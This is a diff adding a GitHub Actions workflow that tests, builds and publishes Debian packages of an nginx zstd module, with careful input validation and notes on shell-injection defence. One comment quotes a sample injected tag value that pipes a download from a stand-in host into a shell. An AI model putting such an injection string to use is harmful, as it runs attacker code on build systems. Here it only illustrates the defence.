@@ -1,0 +1,307 @@
+name: release
+
+on:
+  push:
+    tags:
+      - 'v*'
+  workflow_dispatch:
+    inputs:
+      module_ref:
+        # No default — operator must provide a real tag like v0.3.0 so the
+        # downstream `dch -v "${MODULE_VERSION}-${DEB_REVISION}"` gets a
+        # digit-leading version (dpkg rejects "stable-1" etc.).
+        description: 'tag/commit of module to build (e.g. v0.3.0). MUST start with v + digit.'
+        required: true
+      nginx_version:
+        description: 'nginx version (e.g. 1.29.5); empty = latest mainline'
+        required: false
+      deb_revision:
+        description: 'Debian revision (e.g. 2 for 0.3.0-2)'
+        required: true
+        default: '1'
+      dry_run:
+        # Defaults ON for safety — workflow_dispatch with default inputs must
+        # NOT cut a GH Release. Operator must explicitly uncheck the box in
+        # the GHA UI to publish. Tag-push path is unaffected (no inputs).
+        description: 'Skip publish (default ON for safety; uncheck to publish)'
+        required: false
+        default: true
+        type: boolean
+
+concurrency:
+  group: release-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  test-full:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        # Variants here MUST exist in t/build.sh's case-dispatch and SHOULD
+        # mirror t/build.sh's ALL_VARIANTS array (the default-when-no-args
+        # matrix used by local iteration and t/matrix-parallel.sh). The two
+        # lists are hand-maintained — when adding/removing a variant, update
+        # both this matrix AND t/build.sh's ALL_VARIANTS to keep release gate
+        # and local iteration in sync. asan and valgrind variants are
+        # dispatched by t/asan.sh / t/valgrind.sh respectively (not
+        # t/build.sh) and remain manual-only — they're not part of the
+        # release gate. See docs/stable-status.md for the matrix.
+        variant:
+          - ubuntu-22.04
+          - ubuntu-24.04
+          - ubuntu-26.04
+          - ubuntu-24.04-shared-only
+          - ubuntu-24.04-brotli
+          - ubuntu-24.04-dynamic-brotli
+    steps:
+      - name: Checkout
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
+        with:
+          ref: ${{ inputs.module_ref || github.ref }}
+
+      # Inlined lint (was a separate `lint` job — runner-spinup overhead
+      # exceeded actionlint's ~2s runtime). Fast-fails before docker builds.
+      # Tag-push releases skip test.yml entirely (test.yml runs on PR/push to
+      # stable), so this lint step is the only actionlint coverage on the
+      # release path. Install logic shared via t/ci/install-actionlint.sh.
+      - name: Install actionlint
+        id: install_actionlint
+        run: echo "actionlint=$(bash t/ci/install-actionlint.sh)" >> "$GITHUB_OUTPUT"
+
+      - name: Run actionlint
+        run: ${{ steps.install_actionlint.outputs.actionlint }} .github/workflows/*.yml
+
+      - name: Validate ref/tag
+        # Reject refs that don't look like a real tag (vN.N.N...) — prevents
+        # MODULE_VERSION="stable" from leaking into dch -v "stable-1" later.
+        # Covers BOTH entry paths: tag-push (`on.push.tags: 'v*'` accepts any
+        # glob match, including `v0.3.0-rc.1`) and workflow_dispatch. On push,
+        # inputs.module_ref is empty so the `||` falls back to github.ref_name
+        # (the pushed tag); on dispatch, inputs.module_ref carries the operator
+        # value. Without this gate on tag-push, a release-candidate tag would
+        # dch-encode as `0.3.0-rc.1-1`, which dpkg version-sorts NEWER than
+        # `0.3.0` — exact opposite of semver intent. Operators must use the
+        # Debian-idiomatic `~` (sorts EARLIER than empty suffix), e.g.
+        # `v0.3.0~rc1`. Pass ref via env (not ${{ }} interpolated into shell)
+        # so a hostile tag/input like `x"; curl evil|sh; "` can't inject
+        # commands before bash parses the script.
+        env:
+          MODULE_REF: ${{ inputs.module_ref || github.ref_name }}
+        run: |
+          # Suffix character class is constrained to Debian-version-safe characters
+          # ([a-zA-Z0-9.+~]) AND the separator excludes '-': dch builds the Debian
+          # version as MODULE_VERSION-DEB_REVISION, so a tag like `v0.3.0-rc.1`
+          # would yield `0.3.0-rc.1-1`. dpkg parses that as upstream=0.3.0-rc.1
+          # revision=1 — syntactically valid, but dpkg version sort treats
+          # `0.3.0-rc.1` as NEWER than `0.3.0` (no semver pre-release semantics;
+          # `~` is the Debian-idiomatic prerelease marker that sorts EARLIER
+          # than the empty suffix). So a release-candidate .deb would silently
+          # outrank the actual release. Accepts: v0.3.0, v0.3.0+build5,
+          # v0.3.0~rc1, v0.3.0~rc.1. Rejects: v0.3.0-rc.1 (use `~` not `-`),
+          # anything containing /, spaces, quotes, etc.
+          if ! printf '%s' "$MODULE_REF" | grep -qE '^v[0-9]+\.[0-9]+\.[0-9]+([+~][a-zA-Z0-9.+~]+)?$'; then
+              echo "release.yml: ref/tag must match ^v[0-9]+\.[0-9]+\.[0-9]+([+~]<suffix>)?$ (use '~' not '-' for prereleases per Debian convention; applies to both tag-push and workflow_dispatch; got: ${MODULE_REF})" >&2
+              exit 1
+          fi
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@c47758b77c9736f4b2ef4073d4d51994fabfe349  # v3.7.1
+
+      - name: Build image
+        env:
+          BUILDX_CACHE_FROM: "type=gha,scope=${{ matrix.variant }}"
+          BUILDX_CACHE_TO: "type=gha,scope=${{ matrix.variant }},mode=max"
+        run: bash t/build.sh ${{ matrix.variant }}
+
+      - name: Run tests
+        run: bash t/run.sh ${{ matrix.variant }}
+
+      - name: Upload failure logs
+        if: failure()
+        uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882  # v4.4.3
+        with:
+          name: logs-${{ matrix.variant }}
+          path: tmp/run/${{ matrix.variant }}/
+          retention-days: 7
+
+  build-deb:
+    needs: test-full
+    runs-on: ubuntu-latest
+    container: ubuntu:${{ matrix.distro }}
+    strategy:
+      fail-fast: false
+      matrix:
+        distro: ["22.04", "24.04", "26.04"]
+    env:
+      DEBEMAIL: "ci@zstd-nginx-module.local"
+      DEBFULLNAME: "zstd-nginx-module CI"
+      DEBIAN_FRONTEND: noninteractive
+    steps:
+      - name: Bootstrap deps
+        run: |
+          apt-get update
+          apt-get install -y devscripts equivs ca-certificates curl gnupg sudo git
+
+      - name: Checkout
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
+        with:
+          ref: ${{ inputs.module_ref || github.ref }}
+
+      - name: Install nginx mainline
+        # Operator input via env (shell-injection defense — see Validate
+        # module_ref step for rationale).
+        env:
+          NGINX_VERSION_IN: ${{ inputs.nginx_version }}
+        run: bash t/ci/install-nginx-mainline.sh "$NGINX_VERSION_IN"
+
+      - name: Compute versions
+        # Two-branch resolution:
+        # - push: tag-driven release; GITHUB_REF_NAME is the tag (e.g. v0.3.0).
+        #   Strip the leading 'v' so dpkg sees a digit-leading version, and
+        #   default the Debian revision to 1 (first build of this tag).
+        # - workflow_dispatch: operator-driven rebuild; pull both MODULE_VERSION
+        #   (validated upstream in test-full) and DEB_REVISION from inputs so
+        #   `0.3.0-2` etc. is expressible.
+        # NGINX_VERSION is read from the INSTALLED version of nginx-dev (the
+        # package the module is actually built against), NOT the apt Candidate.
+        # The Candidate reflects whatever the repo currently advertises, which
+        # diverges from Installed when workflow_dispatch pins an older
+        # `nginx_version` while the mainline repo has already moved on. Reading
+        # Candidate would produce an ABI pin (debian/control >> X.Y, << X.Y+1)
+        # that disagrees with the binary the module was compiled against — the
+        # exact silent-mismatch failure mode this workflow is designed to avoid.
+        # The `sed 's/-.*//'` strip drops the apt -<distro_revision> suffix
+        # (e.g. `1.29.5-1~jammy` → `1.29.5`) so debian/prepare.sh receives a
+        # clean upstream version. dpkg-query exits non-zero if nginx-dev is
+        # missing, which surfaces as a hard failure under set -e (correct).
+        # Operator inputs are passed via env (not ${{ }} into shell) to defeat
+        # shell-injection via a hostile module_ref / deb_revision value.
+        env:
+          MODULE_REF: ${{ inputs.module_ref }}
+          DEB_REVISION_IN: ${{ inputs.deb_revision }}
+        run: |
+          if [ "$GITHUB_EVENT_NAME" = "push" ]; then
+              MODULE_VERSION="${GITHUB_REF_NAME#v}"
+              DEB_REVISION="1"
+          else
+              MODULE_VERSION="${MODULE_REF#v}"
+              DEB_REVISION="$DEB_REVISION_IN"
+          fi
+          NGINX_VERSION=$(dpkg-query -W -f='${Version}' nginx-dev | sed 's/-.*//')
+          {
+              echo "MODULE_VERSION=$MODULE_VERSION"
+              echo "DEB_REVISION=$DEB_REVISION"
+              echo "NGINX_VERSION=$NGINX_VERSION"
+          } >> "$GITHUB_ENV"
+
+      - name: Substitute ABI-pin
+        run: bash debian/prepare.sh "$NGINX_VERSION"
+
+      - name: Initialise debian/changelog
+        run: |
+          dch --create -v "${MODULE_VERSION}-${DEB_REVISION}" \
+            --package libnginx-mod-http-zstd \
+            --controlmaint \
+            "Build against nginx ${NGINX_VERSION}"
+
+      - name: Install build deps from control
+        run: mk-build-deps -i -r -t 'apt-get -y --no-install-recommends' debian/control
+
+      - name: Build packages
+        run: dpkg-buildpackage -us -uc -b --no-sign
+
+      - name: Collect .deb artefacts into workspace
+        # dpkg-buildpackage writes .deb into the PARENT of the source tree
+        # (outside $GITHUB_WORKSPACE). upload-artifact only accepts paths
+        # within the workspace, so copy into ./dist/<distro>/. Per-distro
+        # subdir avoids same-name collisions across the 22.04/24.04/26.04
+        # matrix slots (each distro produces filter+static .deb with the
+        # same upstream version string — flattening with merge-multiple
+        # would silently overwrite to the last writer).
+        run: |
+          mkdir -p "$GITHUB_WORKSPACE/dist/${{ matrix.distro }}"
+          cp ../*.deb "$GITHUB_WORKSPACE/dist/${{ matrix.distro }}/"
+
+      - name: Upload .deb artefacts
+        uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882  # v4.4.3
+        with:
+          name: deb-${{ matrix.distro }}
+          path: dist/${{ matrix.distro }}/*.deb
+          retention-days: 7
+
+  publish:
+    needs: build-deb
+    # Publishes on tag-push or when dry_run is unchecked. The `||` short-circuits
+    # — github.event_name=='push' makes the rest moot, otherwise the negation of
+    # inputs.dry_run is consulted. `!inputs.dry_run` is the unambiguous boolean
+    # form (preferred over `inputs.dry_run == false` which mixes boolean/string
+    # semantics across GHA event types). Lets operators rebuild against newer
+    # nginx mainline without auto-publishing; default dry_run=true keeps manual
+    # dispatch as a no-op publish unless explicitly opted in.
+    if: github.event_name == 'push' || !inputs.dry_run
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - name: Compute tag
+        id: ver
+        # Operator inputs via env (shell-injection defense, see test-full's
+        # Compute versions step for rationale).
+        #
+        # Duplicates the push/dispatch dispatch logic from build-deb's
+        # "Compute versions" step. Kept inline because the two jobs don't
+        # share env across $GITHUB_ENV (each GHA job runs in its own runner
+        # with its own env state), so build-deb's MODULE_VERSION /
+        # DEB_REVISION exports can't be consumed here. Extracting both call
+        # sites to a t/ci/ helper would mean writing $GITHUB_ENV /
+        # $GITHUB_OUTPUT from the helper, which is more indirection than
+        # two ~6-line snippets warrant.
+        env:
+          MODULE_REF: ${{ inputs.module_ref }}
+          DEB_REVISION_IN: ${{ inputs.deb_revision }}
+        run: |
+          if [ "$GITHUB_EVENT_NAME" = "push" ]; then
+              TAG="${GITHUB_REF_NAME}"
+              NAME="${GITHUB_REF_NAME}"
+          else
+              MODULE_VERSION="${MODULE_REF#v}"
+              TAG="v${MODULE_VERSION}-${DEB_REVISION_IN}"
+              NAME="$TAG"
+          fi
+          echo "tag=$TAG" >> "$GITHUB_OUTPUT"
+          echo "name=$NAME" >> "$GITHUB_OUTPUT"
+
+      - name: Download .deb artefacts
+        uses: actions/download-artifact@cc203385981b70ca67e1cc392babf9cc229d5806  # v4.1.9
+        with:
+          pattern: deb-*
+          path: dist
+          # No merge-multiple: keep each distro's artifacts in its own
+          # subdir under dist/deb-<distro>/ so identically-named .deb
+          # files from 22.04/24.04/26.04 don't overwrite each other.
+
+      - name: Rename .deb with distro suffix
+        # Disambiguate identically-named .deb files across distros so the GH
+        # Release attaches all 6 (2 packages × 3 distros) rather than only the
+        # last writer. Result: libnginx-mod-http-zstd-filter_X-Y_amd64.deb
+        # becomes libnginx-mod-http-zstd-filter_X-Y_amd64.ubuntu-<distro>.deb.
+        run: |
+          set -euo pipefail
+          mkdir -p dist/release
+          for distro_dir in dist/deb-*; do
+              distro="${distro_dir##*/deb-}"
+              for f in "$distro_dir"/*.deb; do
+                  base=$(basename "$f" .deb)
+                  cp "$f" "dist/release/${base}.ubuntu-${distro}.deb"
+              done
+          done
+          ls -la dist/release
+
+      - name: Create GH Release
+        uses: softprops/action-gh-release@7b4da11513bf3f43f9999e90eabced41ab8bb048  # v2.2.0
+        with:
+          tag_name: ${{ steps.ver.outputs.tag }}
+          name: ${{ steps.ver.outputs.name }}
+          files: dist/release/*.deb
+          generate_release_notes: true
